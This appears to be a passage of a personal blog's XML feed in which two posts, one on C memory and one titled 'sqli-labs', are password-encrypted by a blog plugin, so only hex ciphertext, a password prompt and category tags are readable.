649a7416814a45504bfe41f1994e95af8f29afa0dcacebef57e87df3068c4e9d838967016ceb166e54b7af6bc923e264085e971fccb84f068e7766e14084905422601f37edd521e76263c477bfe5444f0a90237758d2528f8ee8db6171b159826c31245017f94b473331e4f420ed451bf983fbc2000ffff5016529f2911b51a6d3dae6fd12ce3d5400129c28bc057b6466e4c0cff59d60cdcebac5e64a508868ede8fb30a27e917113fb75c952b0ab3a08dbac70e8992f78afe1812758f029a011365d24f125aee129545e6b6b614592b8bcc0335f34380bd72b84f01165e4a8bfff00b81452ebc98e01ab8197272fd1b980a32d480ce3fb2dd99bd75fc509bf646fc00b4aab93c454741d7ddbf7d7507d43bf84730ff4503664f01a8570720f7e31c14d3b5d9be2744fb357844116db3654a4eb071087a08d0dfeafaf85f4b8bc7abe4939cfa15f77501a00db5ad466e06804e98855e3a30629b242c766177ee685476e09a43d8076cd16706df5235e11189dd1734b586960a3a121544d9c318b6d12a53c3392cd9b09ed4d1f4afe5bcad7367ee6e5f454a40b62a0b060342f3a4e259d2349603e6f1229f1538edb370f70e9665489ea44ffd128f3156a3ebf260688321e32ef65f3d51ac15b7e35c994988f6bcba2184407a1b4faedbf78cf108b6d11fb27076e7fc61b68cda0b550233dcbf0b13493569938ae3bf071a05bc4dcd4a997298ae35288c204439d594b9e6208501886dad622248bb57b5535022a4142ee795f397ecb776bd9b21c09dbef704622ba3b6fcbd4bc3e06d8172919ef4ef3bc37ff6d4da5365b5f7272d67c27a3c8a3c96703f45ffc38567d181787344dbccbf9aaaf8cab43b5933cce4a40c71ee2166b9d5f90f422ce118edec963c875f0e940f49ab28636ccb93491ba85ca89efd607cc5e8d7a523451e97fe2b02e40ddf335e507b1c06f53392a196296c44dca381f85f06837a16eac4e94ff5c0b69706f5def95193af62da2aff1eafaf71f8da50694d119df9a583f998343036a566f704c26febc2ade5a453435ac6b20d1cfb10882788864e514b8022ee8a1b55dd5ce3ad05e37250fb781e9763f2da2b080c80e5f09a8c2ebfc5894f6c0ea4e7b88ade2ea1ff4de1bfb7f718f454338dfaa8194205853ebb3f9dc4a29d9161f785df5a895eea4056b3b2ca9439216ca19e2f3e1ebd6f3075554c81b7d4b26c3b74eeae0dcdc7e5e45eb873b0de0e82f156f000e10abb0f0db322016d8f121225096d2e18d849fae57a8034e25d99ae382e3c5fa65f49a8e45fe9e400e0ca7d82dfb089c3f741258bc0cb6945e2a5446439e6d9cd434bd01951623359f4ee20f854ef9d286b20c3858ce005a9e1149dd8533d63f924d902ec594f408f58bbee0cbe74da40413948e75aa4d1753c238fe7889831e0e87cc0b743ccc4c278f04f62112cb73c265b4b072f011875606f97fb2c76e77c2254e82e9f889b3b645935d83ed7d0fafdf0837a1ae840d5e126293a361f76e54c4210f2c44d8644b5af61c08287dd4321de6c72277545cddb10eb4475ea5e0deb378d7b487dec6ad7761c849c197da3d0562358aef388546f3061e27547f0764cef6637b50f51df616ed55eb4657f47bb6f6058f097c418d5518a49b0f4edd1aba4433836b2c924f25597823e9af5adc98702e6405c93754876cb97f78d6bb32102cd8c76e44fed3c12377ab6f2a1c8c07595aa7518f3fff35611d4ac1d87642052982a4f80774d0e2753c88840ace280b4ba34ab7d50153bcf7146631c719bf62df50652d5c0418d36274cff98ac7bc13d640e4d0b4eab3308ef79120f4fe8428b4038114c10234a392d71d5915dd474d2b6450502389b2db99983b63d6e5af50109c08ab7932d4c4d123dd139a93088872e497d1a9151d46490310b21293564908d2fdfdfe5b02b39755ab46dfd7c2e2a0d0589c257ac7695d729725111a9865ac2460ccd1ebcd1c0976b418914f5d4403cf3d298c3cd98a884d7cdaa87ea6c4c382994daa613ea89e84fedf1c22ea2c6002c4bd072e6427f5506f69b080ec7a7712741dd7c508cb800a54929ea9afc7581ae23df058284eb4188084560f975e15486cbf8dca4320afcb5a6cca0bf29c550b2bdda0874ae13e1bbd76f4b67d08597ec342d8fbfa6aa956a7139ff491e1b89a4f8acfd958a1e573d66bc8165a8f058413f81906670a9c90df6e21b0fab1cb0ccaf78b80fe75ab27d6b5832d0b1c1bc5c2374942812cf2ba6d2ec95b5f490b70f118be9898bda0a8a3bf5d038d2cd31d378acbc1287c77699955d4b00ddbeaa3c04e02eb57d84a5408d68cf38b01be3175ecffe6566f0a30f07c808cb854e841d5da9a49f5f635b2898039360307fd0dd53b067d1b8f70a14b10dd55b3aea8ce55db56097a3f0aa1ea2f8a15206eb82f518a80ad619cc61946a32e5ee0ea7f1d9315e80cae041c5e5396ace67715a1c56aca67f8c145b1cc4dfa8e4748deba61d3a97639a29050b7e072bb612139f0caf920dfa10d5cc7e32e8935f8b8ed2da153b6ed6a58dea03e749096bcf91a7427c892476acfbfaee157bdd44d654e015f643497d521b4cbc661d1ad1d0823a13dbe4b83b58f138f1b0d89a0d740185a6944a9428d1d4bbf46c8272e830e379738f7e7418470b7c1b683cefd42c0032c96b47fd7d77453e4e0dfb98be18940ac58396cc9c451a84fecc72bc233842c7e530069f24c44622b9820d4cf52dc6cc6cadce6aff8881492fe1a201515706f6da4577a00b3ac4a07419e93a1d68c489ef5334e22108209c43ed94debd0f3ea24f7d805dbcbae747d9c7ca786e3a48b929080bae4ef9ca0077d724715684de6f3ae774da7dbe372a906582ecb8b10cdcef3880d4ac19ac185cfa1d0bf6429debd93753683adc63c9b9bad4afc8268ac67a3efe8e6ba0d64aa2c0f7ba33c7270fc023a79ba02232b2fef671765b7bf7f29177d473491576ac93b6e516edfb7ab7752fb7c4650aedf8ffa4abc8d911f724f669b22df2ef139dd4945a2993792930a3e31f6383bc1e85c490d010c6977394f8dfda94d5a1b505a067cad9e76ff16fde4550700b22f9914ac868c639fd52ec081b7de30d070bf79ae2f1d288e26cba5729a8896ba777431d286b5c9badf5e62a090d0ff3f47870b94425290b5ac11a440451c5c10a2d204fbe2b2dc0abf4ea6625a1bc1e5060b3940ff7156f9dd863700f2ad28219772fe4a3c3fd9e2340554236ba2fae0c7318c13953e2843401fcf40525dfa5807c64e77c1dccf081e4b16649015e577e4cd1a2b5cf5b06359ba2af875e93b0229f988541f406cb3b799d3429ff2e61fd94794031e38bbfebf14263651e882dee369111751944ae4f114a9a908d49cd24c711c718fc7ed161f2bf8fcf7c7311a5603d84aa28bdad96b24b61246c835d5699f9e0fb925818587edd238f218b066cd7b0c86b8a66432e5fb32d2bc0acb0955c94dc6cee8cbdb7a1ab35a16c77bbedac6666bb57b9a671a32f685408d6a313fe1ffd5b4ab3800d4776c6857812b3bd2572c8b63de1e565bfa42e08ccdcab05d178e816c2366344309efa22a858f6106824f8dc156073b7502a613c80670caa0626372cdd32dfc48c9e6f081c1c95cf3dc4d8d5e1efb7ea8091526dc03e756a7e923928ad6478691527593538405db23670f603fd56118880bad2709e910f5019d2efff042467216c373f3528348b2a27c6474a6156063529629d090b95423e99c7512010603b27ddefe7c532f8ce8719cd067ff7e1fd65d54fde50355499741b1f927507227a2a000b69c9b1a1a7ae5383f15aabcd673c55481eabf936563c0fda099d076555d566cfdde3fa6c04a02804f7f8d8eaf76c25dd433ffa1739f03b0b82a0e96c3f291912e5f7aa62d24379191b37ab2a0280e508d5ee0105c32f42a3b65430e987f17393cb56034edb6f00718ce8985ab964af61e79d5a833d7fbf9a6d6380a41d1eb2d29d892b5bdc450aa8a1e0159ad3ef43dedbb96cb09e12bcc7337537088efe3779d43f40971a5f6f16fd5da331f1ab869fdc18e4de8e67638054185ff63f48b20692f605ac3baf789ab1cdac3b244da3ae3b43cb7af072022835d584578f6e68030fc93f4c005d285d2d4938e0f65defa4142af33452c2c8da161c92146b36eb8dd2c4ebbfe92e82422c2239f0927dc0c533442198d158230525db4c7bd478060d66008502f7560e8c54609b860dce0ee1c92e0351e7634e95bc0b85f86b25515ee107d2618fbe00fb813503af39efa9cf11154105c748e2001844cffffccb6c0d306f1e9f786ac9c7c2e6dd012adbc8f46cd85a7c17ef7511a608cd7152e8d2d089b3d5f2732f3ff47ace32ea167cde0264da70722d921061c70eeb7eae381cfa55669aa18e60641c31f0d52ebbc2403cc7dfea8432dc22334fe37fe3d75d96c430899f3b9e80fb97c931fc4186105669c0b1d047826d59d15e5264e26862edbf0ece824427db58a2e05fed1907baf028f106db2aaa667736542ddef89753cabeea30d010545ced3063b664ec83e7dd85f498b00194f6a681b16384377d8aa7b50a592c22a3d3b6a8b63a5c24a965762b3d15e0fd40e8ef483277ba6cc91775ccb011d7331dadf6471dd3ff0ee0aa4a297f60a785404778f528c4e07eedfe2ffcbbf71237b55b2cc6bfa10cb8e168c5827d7a42d215d2162534c2d55f911969ba58626cb89cdccc6dbe6219d7da254d2654f56c71353f726e419a77db58ab4fb18b8f2d1579ba61ca89c04a505a4d217a815dd29c9479f3f7b85e5f98de2ed80916de390096e03cf3287e2d1f87f7aafe4aa761297e0e347e6fca347d50a253a6495f917bb540aac77e179d8a9338320a9556c8f4dc612fddca7efdc2f226d67c2277821426776e716824f4410f8745e10c2d44d45a9444383edc616e4e77b93f595f9e08b7d7baf694a89458925b9325c750e7ed7c2cabb7a73745ee29cbb01e3ca67216830cd687332d6bf20f316ec113dc070bfc00083280ebb2611e36c46f8b1c06230a05fbc5e9d5bb678cb04f63177d2bead86ea74e179030cb13e9bbbad30248b8654bb8c7f96267850413f4c889007c9e7397db12f57a64cc585e3c6617b25c498e03bdfde5249d5edf41640db08824fed2589ed2a46d365894e894717bee1e39c70c128a8038d757b2300af3ced07e59957ecb6ad20f501f0dc1dc41dbfc475fe4a846589fb7e572856d7e768bd93a66165e2dd4c160faeb1ae9a1e0ec5056abb5b857d2c68c01c2297000bed6eb539c66e530c5573eb0dd034aaa14f92a4aae864315adf90b4057d68b777981b51142843d5f4c55f2fef6080667d911a490f5168f99f29aa6f8770dc5e9e94aa80395e788a609be5a7f6b7fa4e7f6bdeb14aaf27d19073399945257e194ff83bffeb08c13d929e0b346bb1d46d0f9291a902b038ea19888ead70ea9e6355e4c4c97dc88aec3ba57bfbce42032b569e1e379eb40914dc2abb470bbb9de17d64e61a7a80fbf65dcd5d2f3639e19e56295f34c040e40945bb1a0be6f3282e6257297e97959e26649966d7a64c54f663cadeabf7c9155af269692dbcae459e998a9d08d2fbe7a5e3b28ed9c0f57bb40d104913d8628d6fb85418832989c931758d630a631449322b74b5ab2fa0d3dcf76f6d2aa90f18e309c30b838d389725a8b90b218d5f44a3120652a72f626aae3d5829e88cec48a718d06b638f6ca0196584752db7182b1f31374aedad965c3c9bd597e141e710747b536e3d02bd0d56f3d55039462a0bf3b8b789ea3455d956bd8dfa2ab90c5914dd0b47f12997f9a6142afd39f16497db19f03d4d1661eedf974cf4d26f4ade700c959d419515220e902d7f567926ad55a379f23ccabbec9e43a838f6f07fe3269447111a473570a815ef802cad430cdba8782d87be894a742ae9b30b1057e9db2b84f67dd8214f071c37ea02c17fe6d418ed7b989e6d53499bef015783f36b652402d2c281c907a703d7bc3d7c8fa02adce644475b10a55d5d6eb5c2abe91a92bf1b701e620ca7cb7b12e15f348378d5c0c64f6d6ee4e5b258a6925947e0e6880735c92c657aad1d4a733278eaa6bd92fc838340798b60a9ac557b0c3620150a800d0898267d38681602a9b5a68c48b2a96557f21c21482f24ff831fab22aafd7582ae39faf2781a4f883888c43998c7964d22812889727ae0b8c0679ee9d1039a10bba1f0b78b62542d9d7e1d9dd468679e623d84903f10e9986d3d73cd9c0889f0a0dcd61cd126ab6208eab53a9053782b31d1cf4ff96cb828c966c379d53c6a24a343f72d1360ea1542a381b4eebb2bdae798a9797858684f2ca7451517a86b7388cb7ec42cf55aab02a8871ce5878c3bf2ac874d9735f30222b0e6b00544f133e5b82928875ece9459c5a4a84ca5f96f6f0db17a869c9af7eafe637390bb4645a713e12be334f7dfddb144712cf96c12805a8ecabb60fbe810b9d7d00b11bb9f3bf0b68ea6e704436c6179421ca67ec1c0e89bef1f6e64d940ed73da83fd343d661226f90585d37b8fc799e5499cbc6432066437039c778d477359f129ec88a44c7f04a64ab900eebac766357a2b9e17e827699d129ebc68b85ef559adad4a3869ecb6c7a04b9bd8557cfb1dad86dfe1587a2c6a0f8b49eb6468f171a180236bccbb4d4f9d32cceaca2ea8ac7ea1f65156e7ec49644b838d894716037f1c48ee8b211c4793187e1e6d3db062f6c680eb45cf0413a4a62a853de8a35f6335dddaecf6bca82463e28254a5cc5f5e3508d753119a13160d7db08ac17971836b31d546563385603b0474e49ae6e50f14139e5e3d6d35009c09b739297af8cd5fe839f7483b6fc7db295d6d7a3e6c001ac84ff49b579584bce699d592c6bee9e568c8fd522a55bfdbe3a20619204fb30d86cde15ee58a3f7c0c7a039f0df2855007bc34c91f31e1d46210537b24aa05066438b397983a014953a513b99a02dc6160d3adfd4fc7bd17deacfe9c6acedf84e410eae425fd70209a08e236f62a882d42bdfabb83b834477a6e1438c7701875f3b67e46ca6080876a2063ae7887315b2f02c48ae5d2cfb1ada04fce49b73d4ee2b243ef261d7cc4a25bd81f2610ece9a01021f4dcd40f721b54fb75509afc1e395fef7a8cca774ee6958256621f956906cfe0a0d98e8389e64dcec1e75e30964d2efa74e7fb00b3d4f63f52e623e7436ac28de2e8444bc61df071b693f964007b5dace93a8e291a94c704aeb678271f0d6ab330f4b6916ad4f879c73629797cd14c7d90f4d0882f8a5040381b13bdbfb60cb801df7b257d4829a394421c152855b4e625666c12dc0a5acdff765af69295c10a0a55248def18e65f7a4815b1a3e62af8cf902b1fd4a989140f7565f3ce2c1cf7922b8c4d3c64c94e0bf5cc39a26790c17253919d8051cd8bc1dfd8bf755d8232045cde66066758ea12055613286b047e9a9ee87ddc03916c767b99eccf7bd7ff47c1a561f7cb8f7e2127c7888783951e5baf46591678f3a39a82be4b5d0073ef8da26103111e03a3ae396622138da569699dc10e81ada3738a61c3e309c09307438f03824c01512328fc38cee705561e40dd42195b049d686be61a4bbe9069cbfb8386ee99707378496fc6f557fc89c692c7ff6e3187d9906bdc90b9ff9f6c2e3c09aa4d84e5d3b15947e5615f76e79f8af7b574e9ebd01577a88aaf6d9c0518054a773476d34e1162c575a6dc418b00643bee8b50a9e5985b6f73352b8848a0c9884a7fa95e395ebea7c41c4c58dce32eaab064b78b83c5001fcdf34a9fdf2d347502c05a8aa20244d3c3d45af128b3196222beeb0368f0e84762ca4a182302183f0ca5bb7f4f1099a3520e5f9ea9d1dfabb443f6254a492b080a0eeb3de2c6a047ce6e561f06dae267822f2bf63c6c52477b887df654d11a4bd1f7131e88a6eeaadc19faa5f1e5b45ad091477b21da93d97e054a69d72afb6b6c11df08217caf1693bd67e471849ca71249c277f4be286081fc2f6d07aef3562f906d78fc781cf3514ea3242cd46bd8cf92f7633c54439130adb13ffbb2f23f65f90b162a663b2f2eea04d691f519814ab7b55f5055d90fb24f4787d8e6f2bd389ffb83ac17e1fa401a84256630a47ff35e4c5d1537d70dfb214f94f394565e212ed23dc2fd1ef791292a4ffbac0c3c68143b24934c78d7ba3c1578efba78d2823a41c6e2166bfcc2c8dfca6d4a87c94ee3720fc65f38b4d36c33ba206e977ca3f1d5a3c7c131fd0488d512a4a293cb11837c4d54c8ee9e6b915bf29c597e9d3e1357fd7de72aa4c6f171e40cddec2e9cb2175a555553db9324fa715c48bf0f5a91e08e724e864df1f021e8534d68f4889c48c3fa40e6446b85b15479c54f9c13cd395ec2a0a3a6f555c4fa24b389c869796e1cf1e2499e0c37018687d867631cfe3fa1a27b111ce98d69e72c31962b5cd9ae21a15164043febba6e4bd17b63dca264681a6107a48734e6be2d65ecd550d2136211c58c4d742d96f16d084bfab5f165e80ad43265535ada6ba7f92d0681a6ba60eabca6e892f552a0ff04b98b08f5aa53480b5808bdca8378cbb1326efe2c5361f325f4d5f62723bd82259e0e26722f5af2e8fd0dd6da2c591884ba704ab92d84e5bb1b20101840d62e9f2244f8e26ac2abfdbc54b9d3f6b561384e31e647551bbad8b1d48e2589c77ab1641eb976c25c4aff0b2a3de185e555cfcb423a5932d0bd5377bfa1cb963dab8d6a30f2bc7a03ce6dabb5aa9592a424f62187ff8c909d60acf2a1f0c80ee89f96e3b7252498f9296e9c90ab1018cb0a24fb7f5be6ee9337a6881476353e632e03c30fabd7b912f46bd2254e360350d295436cee7b13c1c9094df88fdcb551279e1fadba8a6c8cef96570e3c52f281c826fcc0547c902264890a122bde7a76403667c27c16e6fe26c57f7f14b6eb34dda28048b562552706fdf17913e3e63b96457e015b6a0359e59b30fb0fa113a6cec3abb925bd1297b58f3a8892ee74055f65a39baa98ecd5e5f7c5136b208cda698250f400a3900dfa52d89c41695ba0f124feaa921196f6e9ebc437c407be982e59d90d27d1b9fe63ffedc0ac2ea11c57c89358d33a7d2acc6001de25cebd76262126f1c013f03117117eee8ae3ba2576494d8de86c0baaae87896bbf0c994d1cfd81683cca3525f357a4141404d63ae4685b0971a30d0eaa7b5b198033c65da498b89f98ee0b6578d32729a993e09dbaa7a8453629c3f97a9331cfa7e0ceb106d80cc6fd44c7219dcadca24d12500f31b2717b8c3d2cba80c3e61af02bedff6e1db8a56e1fc739e336885fa17912cebf4ceefdf9c7837113a09ef512b9b1aee8b41c23bae5d84994ed47ffe64918ec4dfe70eed5ef4d0487cb25011bde000a53d49f6cf90b2290b660e55e880d931069b6d27ea8e82e5a3918b336b8a61e8b53c507d5fa4765778e0ff859a075234d539628bebbe36177f3cd6558c49600fee4b82dd3a7dcefae7eb3092017194f66f1177ecbcfb1f1c6692e2f4ad9ea840f0f4ce45e0c758abd9e7cc6ace0c9de4df07675776a78578f861a99e9208b3e887675077b9b578fb1fd7205264ec755199a56591e7e7a9f61ec29b6333a410e7ded09afa813d9f5e24e1ed7bab771deb56f5b922c07be209a9cfbeafd5e7b628ef770cf8e5b17bcd319bb3a506b1cc7999d2dbec61bc4b8ff3897beabce7875b9ee4ee22e671111a6424440bbca14f43c2dc40aebe433fb39f6cab885000320c3cd139cd2b685687e18f596e19863ba408bc10b0c9c26d511ac69239d1632a9e8298746cb8112543dd911acd66031c48b0f5f2e4a2a7e6101a40a713c6d12f52f4941f43f0db56a38d3fd4a22a4b5de55bfd30278510d3870e5bc3de6e466b238ce3d4f12cea47084afbe522da74833fa33802b0a6bb6811a6501ee48376ee661840949b86b6edcd0f7077a174b285ef97b033b1419b49761efc201e07fb2f616fd74d53165c326261e7b71f7d421972d750ec5f39f9826bbddbffb85425376ee88796ba832ad9ff40ae13e16fce521a024928c96cdbf386810ce515e2bcc1ac7f8ccf3b6f6e77ca1a9dc615a9b0cc8a474741fccf06bfbbd7635f5939e2f2e5dd90330a66d0202d0e52d512dec2cdc631e74259e80a73c5369ce956664860fc1397d779b1020d506f4203a06bac9c6611d20ebb976a7c74c68e29719a550a9fef88b5469980ce9551b241f0f5c5b3133e43dffc81141bdaf8afc2e45af392564dcd8d2aa5452b4c8b0c3755c62e3254bb29f6e4bc4dbc58133168018bf38811cd3868c086b30c0c69737999eaf3d67aad93a0e6fe670989f1c19f6e1363c9b58ef7627a5964a8dc73c4a886cbc41fa78ec283e36999390282fe967fb5cb99e81d3a4b4087502d7752521ce3b481740842171ecb5ed58df42501648a29403625edee17dc7fdcd0b403d438e0a5f5594ec3b9b62b2d489797e4da680dca49b5d1498ad909af2a5ff16e7320069e462f5cf0b69299c9d741112431414f6779b0aa69795fa4746c07ace54e2537c3dec214c036619458e5626bd8117945610fdf3ac8cec6da957e2646ef1f2f319a2b64d4614e6bd9e95e4c9dbaf1f52f0e02ce6643e3b746a71203cfe8b19552eef0fa949e14a69ab8ea2795db0e2ec95a1761c21117432526a17ccf071cff0309aca770a94c459907334f29d3c4e064cb070d8c48510868d894fc6c184e5e60a9bef378410dc2cb3dd64b9138c2909268b64cc18f9a3f66a3a2d55429b5240e1a4ce48b8a63ea5b3b2ffc1acfa3c1cecba2212d1fdaf73526ad6b743555118011db5fd6f1b7c41517310024502613b302499c470e088b9e5909811917550d794cc482a36dedb789cfa95c8c7ce79cc66f0d71db250eba09420ed26f9f18ee9bb27a790556e90ac47b187b3c5719f3fd1514900587d039612e0d497f93eb9323ae9a2dced4f6cbf8b3ff3251ef347c364bc427d251cfdf929541c28e6d9e33bfc1de3a8c4b2e5d7a97f1857134f4d7ada520b61380870b46b4e33a88841fad6b05ce4b91c9fbcdc114ca2ed87408a154de2263144df7ccd7391c4dd4248a1f0b481824f81f73e0f4a742124ac5505a536b9d89d4601d22ba676729c5de310fd3522c789c115bcacd456e8b4c72feb846b0b24e8f77b766c6dcb483fb45962d5bbe9aa8feda92099510e777a4525b9ad424b41abf8a664579f7957a077df43f6fdf2bc99e4ace6a2337cacfdc6bd3a897da0ed10fcd5e73c99aa0aab05f5a7b32948be47bc8194c8a4ea0a82893d5afceb5de92ec081ca0e528ff7253cd51a8ccef0ad817f81e6798f683703e82aaf10f1bbd50757724a2ce0e5324e07af4b82a600e0e12765a54b9a6845b0691837b1b0ddbf36d3c2c369dc34696f7f630e7fd24969a7d1b760724e69af32b25476d7f2817ed91a5f8f692682e4a9cac6c27822509d3dc187bdb15ae44553fc509e926ad5ae38e5a62320e1f8f229f7e80d34493c12abb6f618e3968aa69a8c7398030def92280fde55ae6105ed184af54ff5e866cc5c0b6b9ddb77879fe0a83add1c110304a261985f4832a7145bea1de0b0799de38dfa366e5c93628d69d7a4e8d1fff141cf89374a74b47dd0cc9b4453d761881b3bbe917b12858c1101f037fc90b2bd8bfe5e19e35d55c38729b5621f99f4e5b75a319aafe459396136a0f7486f463fd1c5fa7826f1fd114a0227cd8c47366450bb80c50c6ae4f7120477b5dc7bc72f237749838472457a644dc2626e325428a16892322c551879b353993cd81d8a4c1a749ff3c7f35b55d333785c088360ce7ba325be059d0a434fe8603bfb311ca08a699505857c8ff027f925cd4de6ffec0358acb4bffbba7464b054ce838ad11c5be2de127c9b3fe5a06616b645d9297ff9b07a2ddd2a958b15390e998b8dd5772c8db09b355f70a93c6bcdbe985dc1f0ecc26076c68183c4a482e7f8e612702bc427279dde88b6f4ea35e001f90df651aa7f332aa97bb9f8dff36e44d1e8a1798ba6b7fd4a0cdee8982fae410a1afd3293b4b6769b26d196f38926f13f2b39945a1adb84cbdff4709309cc17d74cc9eff13ebe90259e4cd6d41cd09f1f9f4e305dfc437882625f93070299153fd71f5a4078ef57edf7f092c5ed3605b2e124070092bb5158c8336a02379653d1f869296ab6c06d9e42793bd571c929422a6b7272fc5b78e989c9f799b3327eee45315048a41703ecd5166bc7158e1e9f965cfc103a3a7e0edd579d7e583c36bbda150cf598175e804be11ed108c40785bdf99bbc81cd1b6a503701b18723b91446842a5ffe5d590065731d90b848a61825f61a5e7001b785549767dbf1b200d13204d593f409f97f82a476cef863541b833e017dfda6c7ab3768d0b37fd2bf1b3887481148da0e399f840907da7db7118a13399e3bf05a7d4761599268b9a61fec6da16594d422188cf89ff41d5cd8d5b9d7725b1816549d8977ebaf794db8fe7c46cbf70ca8bea6732710277c3a3c5ffccc3b049a2209673298e770866755e40f9e470061256bef657017b07349e25308480f371287df6145d9e87d11bcd37ecd7901e99694aa505a4edb03302e61c1c147cf4d1f377de7fb9a29894f9b7a63b9d3dc81ce910e48f4c25309659bccc8f4646e4c72bf4b043796a6af2b52bd49c903d44c999274db6c1cbab404b04cb725ebad357950eba6a0c3df6f758895cecef872d752e674704e79c568e3b728c5d9fcfc59a91dcfa659d5e82735570f88e8b934284d836ff91165a615b4c0e95c6c549c20b686add19741421c8787eef03ccee3aebacdeb2c759694f113f322b36cd1e1d30de79c0c486c247a4eb114186792a487615a730c0f703f99767e238c249edcad68d3659ac202c2073abd16d778ef41135811680c677cbe817df9df33c627f6e889e52c2865e9dd0533b982b68c35bc9a79499b9d08eea394072acf55b4091ce8d9acc3e2735458feb99f1e278999c0a4cdb7138fed549fa9ad3257d77cb3b4e75411617159385bfaa43741d9b9956da2e798290bfe7e2ca9affe2ba9b60d4940a267ec526d2b7d4fe7043a35db8f2e4f7836d6b81939f9804cb22d246afb37ce82dbf2ea6723aee0696425019d984fdaf88cfe85cbad60f3c029a15228f2bdb27fbc4c802a3b9548b8c7b95de4e68422c2dfe2cf868b1d9448bf3ee637d193e4e2b46391732791531057e35034a903c3e4c117132e782d2a46380dc10c0cfa0d2abd34749ee3f416b0afef9fd2091dac0f08cec0b412c812d3188914125d47f8e967a18c0a73d8c07773885908c7d72108d518c6cff5e6466490bc2e6a9c3e92e22c4f9d30b22d81</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Welcome to my blog, enter password to read.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>C&amp;C++</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>C-Memory</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs</title>
    <url>/post/sqli-labs/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="46e6e181a9c5323e10d93a611817bfc14308d86fd1c438a52778e197b93818dc">65b591f270a691a8bcf50a13db064a05e704c5f09c6b76f3f7894255310b1125a08376231179bae6be9c4c8e75408b0de9a6048705da1f6fcb5964a580eb1cd145fd66edec8c66f04adf174365bd50e2ed1a8bcdd5a35247697a026e5fa6c0a791b221c173444cfebfcf3ec8b138356d154336c3e85265e540ef9ffbeb31b9168718b6bfe0628470fc8d3c26c2be1cd4c1f970c9cb22f067498dfe4a773591baf775dd0906f9662ba0bf2505db31525c56660a78ebfa4cfcfa90e22fa3386ed1864f1114a5d73f386e151a1f839a14af2661290b73a1045227da806d2966c4f9c6d369df58c9e06c4a2f141bc6759da0a223d8e183d56cdb8763cf0b0b6ee07cc5f8673aefdc0be06ae976e3dcddcd3f5cced45fb564f16938ec4411adc20ce39a1c3f7255f93fc7db5452ddc815dd37801729284304b8ef587175fbcb3bbf29f41fd8ac7d49dc9e0d121f1816ed422b00f2e3dd6872b4ec8fb71eadd5961811b16133220d5f868f63330da80eb1b32830fb0fba4d39993daec709822505f9f08b8f59fefb66847f694e27e62583cec64d3bd2f676d824d339c1668a87c94096b968abace76a45cce4c8b24beb4823396a1d04b83a3b2a160caa6d24d5d14491571737934892497b224f7f228c4ed5610598ff0a2dbc8856bb2759355c449e6e861ca76cb49a6a753e4d9fc0e8afe6e66ff70ccf862ed6af71c4321f1d4a65ad0266f82afe25037d763cd56e926ea7add9cdf09846cb2255d8b72081803d18969da9e0f5766bab2719fc6d0c6b9eaffb5c1e1e96de84629a0a4a5692d0b4a7187af11c7e182ecea78244299d9a75912592cf6315d663ebb02a6ea03db04a9158dd2acd62ccff6f9a41e1f5fd5260b68520b32eb05d37e2530abafabdaa11fa6998c1f23b213248f82bfd908acb2cdde7c9224502155dd88a1cc953ccd58543a6139177390f82cfcdbe1f10932f84471de2c73413431acf7f8456146cc6ad6e840278fd6fffecea307cbc2a56939a298f70c297df23c09a5373533066a8c6852512260622a7d152d2306e53918194b6b1d142c138935e76f8adb3f443b5ee49ee9a200a05e21df00d7741a808b05a25c8f6fac10db6f056cc7720b72c7dcc71b73fd97f14f05d1033baa895df4047337c70219a8b28f20ddb5df1765f397d9549a83bc364bb0480e89de80a2fc443ceacb0388de9c829934428912221ba709f58b9daab7cbd3d4f4bd8c082e7a4262008c7417e2e9bca3a13bc2626c26431671950b7c6c22cd3d4f5eac737adcb124f5e7e523f5fd76090dbcc39a41859a0ebea2c64c02cd5545676901acf3cce3244dead2642f5d4722ceffd123f865561d47bdd3978845ff8c295d82d554d6404fe9b65302d3b6ad16ea8770c8f4d00d0366ad49c544cbd289867a444c02575c49dbd3c87a5da994b16de1b2b745d4eef2e84a7f7c78ff181c1cf515ad701d07b29da58252e17b1b79595219015a5878aae7a68b8e76de1cda34b34e35988102788a25b82f1d3054f2a53483f6bd59542060ef03601daee4e1f5b25c06ea30bbb254e16077eb1b9a24988b2107e81a4aa82ee7864908c3bfbcfa30f979edb4e92c709bbd861fa89241be742d0bf04fba9a7bb04a18e1687ca301d4507fca42f9090421af812a7b949726ffb0d228bbd7350ea97ac847e8af203fe853922f14dcdc1e5ab9abb83f5b22cbdd55241cf64da602abf8d5d08c58c01dab0778331d412b6c4b6067cb7fa10aa9bb067142bd76004aff7b743b898a87b41ba2486b5697e705bdebf204bcb37db5e92ea22b2f236ee893624dab01fb5ef5e70ee9bff51a1d39c62e65818e71db0d2e17a86217de2632deb803adf60d6627debf0ce043f76c603a8de3ae173527a49f71186c3fa22c81295f7ce4f6f2e44e22b186947e10fc3c1b1e6d663814544bdebdbf363f9d768bf369275b096f74ba19c6a709073abe21bc58270c9479152130fb1ecb2b2ec7592c485615519b68002a649f5c0ae1b9f2d35fa257cc0db0fa5341fed23ca2f7a371c5fd2484af23b726da361a414aec50bba0d56858af5b73690d97ed2729f6d874feb38fcdb7b8edd680ccb9848ab0a850b487ba5ba6e9766150f3bbe604c5a835dbd6c3ed2ae59656910fd8feea67174838852acdb7007a5741f3af937214229298767003eff55a08b39689a90daa40df3396fdd9de037fd7eae5036e6304959dbaee7502a3f00bf20dd3a471f8dbcbee4965587490390a4638b6bfba491646e6e37a7dc3eb73dd881756b340a485efe2fc8f06b3ff0e2f3ac7ef078419a73524ad65c9521772bea433765f59a81b94f491ec7aaad0a88152e1730e9acda9c0047bc237b849d6162d3397f174df082a6bdbe5f481844f75aa1f4c24450de320a1b6116254575f476abdaf543b9f2efca0053ed5e99297f65fba8b6056826ec26f2efddf63a741f4a679c78982a81b69ffe274b3994eed339a0bedbcfa6eea03aeea69a946336aa385b1d9174d59e